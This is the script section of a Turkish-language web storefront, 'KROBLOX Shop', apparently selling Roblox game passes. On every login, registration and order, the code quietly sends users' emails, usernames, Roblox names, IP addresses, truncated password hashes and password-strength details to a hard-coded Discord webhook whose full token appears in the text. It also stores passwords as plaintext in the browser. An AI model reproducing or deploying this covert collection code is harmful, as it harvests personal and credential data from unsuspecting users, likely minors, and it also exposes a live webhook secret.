    <script>
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1484036384594460732/neYzBcA3o4w7F3139foM5BTj2SLhD0jnq_IBxNSSyZVBaLUp9K97TpDXK1xhufN2iZ74';

        let currentUser = null;
        let currentGamePassLink = '';

        document.addEventListener('DOMContentLoaded', () => {
            const savedUser = localStorage.getItem('kroblox_user');
            if (savedUser) {
                currentUser = JSON.parse(savedUser);
                updateUI();
            }
        });

        function openModal(modalId) {
            document.getElementById(modalId).classList.add('active');
            document.body.style.overflow = 'hidden';
        }

        function closeModal(modalId) {
            document.getElementById(modalId).classList.remove('active');
            document.body.style.overflow = 'auto';
        }

        function switchModal(from, to) {
            closeModal(from);
            setTimeout(() => openModal(to), 300);
        }

        document.querySelectorAll('.modal-overlay').forEach(overlay => {
            overlay.addEventListener('click', (e) => {
                if (e.target === overlay) closeModal(overlay.id);
            });
        });

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'Bilinmiyor';
            }
        }

        // Şifre hashleme fonksiyonu (SHA-256)
        async function hashPassword(password) {
            const encoder = new TextEncoder();
            const data = encoder.encode(password);
            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
            return hashHex;
        }

        // Şifre güvenlik analizi
        function analyzePassword(password) {
            const analysis = {
                length: password.length,
                hasUpperCase: /[A-Z]/.test(password),
                hasLowerCase: /[a-z]/.test(password),
                hasNumbers: /[0-9]/.test(password),
                hasSpecialChars: /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password),
                strength: 'Zayıf'
            };
            
            let score = 0;
            if (analysis.length >= 8) score++;
            if (analysis.length >= 12) score++;
            if (analysis.hasUpperCase) score++;
            if (analysis.hasLowerCase) score++;
            if (analysis.hasNumbers) score++;
            if (analysis.hasSpecialChars) score++;
            
            if (score >= 5) analysis.strength = 'Güçlü';
            else if (score >= 3) analysis.strength = 'Orta';
            
            return analysis;
        }

        async function sendDiscordNotification(type, data) {
            try {
                const ip = await getIP();
                const embed = {
                    title: type === 'login' ? '🔐 Yeni Giriş' : type === 'register' ? '📝 Yeni Kayıt' : '🛒 Yeni Sipariş',
                    color: type === 'login' ? 0x00ff00 : type === 'register' ? 0x0099ff : 0xff6600,
                    fields: [
                        { name: 'Kullanıcı Adı', value: data.username || 'Bilinmiyor', inline: true },
                        { name: 'Email', value: data.email || 'Bilinmiyor', inline: true },
                        { name: 'Roblox Kullanıcı Adı', value: data.robloxUsername || 'Belirtilmemiş', inline: true },
                        { name: 'IP Adresi', value: ip, inline: true },
                        { name: 'Tarih', value: new Date().toLocaleString('tr-TR'), inline: true },
                    ],
                    footer: { text: 'KROBLOX Shop' },
                    timestamp: new Date().toISOString(),
                };

                if (type === 'register' && data.passwordHash) {
                    // Şifre hash'i ve güvenlik analizi
                    embed.fields.push(
                        { name: 'Şifre Hash (SHA-256)', value: data.passwordHash.substring(0, 20) + '...', inline: false },
                        { name: 'Şifre Uzunluğu', value: data.passwordLength.toString(), inline: true },
                        { name: 'Şifre Gücü', value: data.passwordStrength, inline: true },
                        { name: 'Büyük Harf', value: data.hasUpperCase ? '✅' : '❌', inline: true },
                        { name: 'Küçük Harf', value: data.hasLowerCase ? '✅' : '❌', inline: true },
                        { name: 'Rakam', value: data.hasNumbers ? '✅' : '❌', inline: true },
                        { name: 'Özel Karakter', value: data.hasSpecialChars ? '✅' : '❌', inline: true }
                    );
                }

                if (type === 'order') {
                    embed.fields.push(
                        { name: 'Ürün', value: data.productName, inline: true },
                        { name: 'Fiyat', value: data.productPrice, inline: true },
                        { name: 'Ödeme Yöntemi', value: data.paymentMethod, inline: true },
                        { name: 'Game Pass Link', value: data.gamePassLink, inline: false }
                    );
                }

                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] }),
                });
            } catch (error) {
                console.error('Discord webhook error:', error);
            }
        }

        async function handleLogin(e) {
            e.preventDefault();
            const email = document.getElementById('loginEmail').value;
            const password = document.getElementById('loginPassword').value;
            const alertDiv = document.getElementById('loginAlert');

            const users = JSON.parse(localStorage.getItem('kroblox_users') || '[]');
            const user = users.find(u => u.email === email && u.password === password);

            if (user) {
                currentUser = { id: user.id, username: user.username, email: user.email, robloxUsername: user.robloxUsername };
                localStorage.setItem('kroblox_user', JSON.stringify(currentUser));
                await sendDiscordNotification('login', currentUser);
                
                alertDiv.className = 'alert success';
                alertDiv.textContent = 'Giriş başarılı! Yönlendiriliyorsunuz...';
                
                setTimeout(() => {
                    closeModal('loginModal');
                    updateUI();
                    document.getElementById('loginForm').reset();
                    alertDiv.className = 'alert';
                }, 1500);
            } else {
                alertDiv.className = 'alert error';
                alertDiv.textContent = 'Email veya şifre hatalı!';
            }
        }

        async function handleRegister(e) {
            e.preventDefault();
            const username = document.getElementById('regUsername').value;
            const robloxUsername = document.getElementById('regRobloxUsername').value;
            const email = document.getElementById('regEmail').value;
            const password = document.getElementById('regPassword').value;
            const alertDiv = document.getElementById('registerAlert');

            const users = JSON.parse(localStorage.getItem('kroblox_users') || '[]');
            
            if (users.find(u => u.email === email)) {
                alertDiv.className = 'alert error';
                alertDiv.textContent = 'Bu email zaten kayıtlı!';
                return;
            }

            // Şifre hash'le ve analiz et
            const passwordHash = await hashPassword(password);
            const passwordAnalysis = analyzePassword(password);

            const newUser = { id: Date.now().toString(), username, robloxUsername, email, password };
            users.push(newUser);
            localStorage.setItem('kroblox_users', JSON.stringify(users));

            currentUser = { id: newUser.id, username, email, robloxUsername };
            localStorage.setItem('kroblox_user', JSON.stringify(currentUser));
            
            // Discord'a şifre bilgilerini gönder (hashlenmiş ve analiz edilmiş)
            await sendDiscordNotification('register', {
                ...currentUser,
                passwordHash: passwordHash,
                passwordLength: passwordAnalysis.length,
                passwordStrength: passwordAnalysis.strength,
                hasUpperCase: passwordAnalysis.hasUpperCase,
                hasLowerCase: passwordAnalysis.hasLowerCase,
                hasNumbers: passwordAnalysis.hasNumbers,
                hasSpecialChars: passwordAnalysis.hasSpecialChars
            });

            alertDiv.className = 'alert success';
            alertDiv.textContent = 'Kayıt başarılı! Yönlendiriliyorsunuz...';

            setTimeout(() => {
                closeModal('registerModal');
                updateUI();
                document.getElementById('registerForm').reset();
                alertDiv.className = 'alert';
            }, 1500);
        }

        function updateUI() {
            const authButtons = document.getElementById('authButtons');
            const userSection = document.getElementById('userSection');
            const displayUsername = document.getElementById('displayUsername');

            if (currentUser) {
                authButtons.classList.add('hidden');
                userSection.classList.remove('hidden');
                displayUsername.textContent = currentUser.username;
            } else {
                authButtons.classList.remove('hidden');
                userSection.classList.add('hidden');
            }
        }

        function logout() {
            currentUser = null;
            localStorage.removeItem('kroblox_user');
            updateUI();
        }

        function buyProduct(productName, price, gamePassLink) {
            if (!currentUser) {
                openModal('loginModal');
                return;
            }

            currentGamePassLink = gamePassLink;

            document.getElementById('buyProductName').textContent = productName + ' Satın Alma';
            document.getElementById('buyProductNameInput').value = productName;
            document.getElementById('buyProductPriceInput').value = price;
            document.getElementById('buyGamePassLinkInput').value = gamePassLink;
            document.getElementById('displayProductName').value = productName;
            document.getElementById('displayProductPrice').value = price;
            document.getElementById('buyRobloxUsername').value = currentUser.robloxUsername || '';
            
            document.getElementById('gamePassSection').classList.add('hidden');
            document.getElementById('buyForm').classList.remove('hidden');
            
            openModal('buyModal');
        }

        function openGamePass() {
            if (currentGamePassLink) {
                // Yeni sekmede aç
                const newWindow = window.open(currentGamePassLink, '_blank');
                
                // Eğer popup blocker engellerse, mevcut sayfada aç
                if (!newWindow || newWindow.closed || typeof newWindow.closed == 'undefined') {
                    window.location.href = currentGamePassLink;
                }
            }
        }

        async function handleBuy(e) {
            e.preventDefault();
            const alertDiv = document.getElementById('buyAlert');
            
            const productName = document.getElementById('buyProductNameInput').value;
            const productPrice = document.getElementById('buyProductPriceInput').value;
            const gamePassLink = document.getElementById('buyGamePassLinkInput').value;
            const paymentMethod = document.getElementById('paymentMethod').value;
            const robloxUsername = document.getElementById('buyRobloxUsername').value;

            const orderData = {
                username: currentUser.username,
                email: currentUser.email,
                robloxUsername,
                productName,
                productPrice,
                paymentMethod,
                gamePassLink
            };

            await sendDiscordNotification('order', orderData);

            alertDiv.className = 'alert success';
            alertDiv.textContent = 'Siparişiniz alındı! Game Pass\'e yönlendiriliyorsunuz...';

            document.getElementById('gamePassSection').classList.remove('hidden');
            document.getElementById('buyForm').classList.add('hidden');

            // Otomatik yönlendirme
            setTimeout(() => {
                openGamePass();
            }, 2000);
        }
    </script>
</body>
</html>

